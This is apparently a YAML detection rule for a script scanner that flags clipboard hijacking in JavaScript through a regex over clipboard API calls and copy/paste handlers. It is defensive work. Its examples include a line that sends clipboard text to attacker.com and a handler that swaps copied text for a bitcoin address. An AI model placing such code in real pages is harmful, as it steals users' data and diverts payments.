# JavaScript Pattern: Clipboard Hijacking
# Detects clipboard manipulation and theft

id: JS-015
name: Clipboard Hijacking
description: |
  Detects JavaScript that manipulates or steals clipboard contents. Attackers
  intercept copy/paste operations to steal sensitive data or replace clipboard
  contents with malicious data (e.g., replacing cryptocurrency addresses).
  This pattern identifies clipboard API usage and copy event handlers.
languages:
  - javascript
detection_type: regex
detection_logic: '(?:navigator\.clipboard\.(?:read|readText|write|writeText)|addEventListener\s*\(\s*["\x27]copy|addEventListener\s*\(\s*["\x27]paste|oncopy\s*=|onpaste\s*=)'
severity: Medium
mitre_technique: T1115
confidence: 0.75
category: collection
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1115/"
    - "https://developer.mozilla.org/en-US/docs/Web/API/Clipboard_API"
  tags:
    - javascript
    - clipboard
    - data-theft
    - manipulation
  examples:
    - "navigator.clipboard.readText().then(text => fetch('http://attacker.com/steal?data=' + text));"
    - "document.addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'malicious-bitcoin-address'); e.preventDefault(); });"
    - "document.oncopy = function(e) { sendToServer(window.getSelection().toString()); };"